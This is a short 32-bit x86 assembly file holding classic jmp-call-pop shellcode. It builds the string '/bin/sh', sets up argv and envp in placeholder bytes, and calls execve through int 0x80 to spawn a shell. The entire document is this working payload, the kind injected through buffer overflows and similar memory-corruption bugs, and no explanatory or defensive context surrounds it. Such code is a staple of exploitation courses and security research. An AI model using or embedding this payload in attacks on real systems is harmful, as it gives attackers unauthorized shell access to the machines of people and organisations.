BITS 32

jmp short L1

L2:
; int execve(const char *filename, char *const argv[], char *const envp[])
    pop ebx
    xor eax, eax
    mov [ebx + 7], al
    mov [ebx + 8], ebx
    mov [ebx + 12], eax
    lea ecx, [ebx + 8]
    lea edx, [ebx + 12]
    mov al, 11
    int 0x80

L1:
    call L2
    db '/bin/shXAAAABBBB'
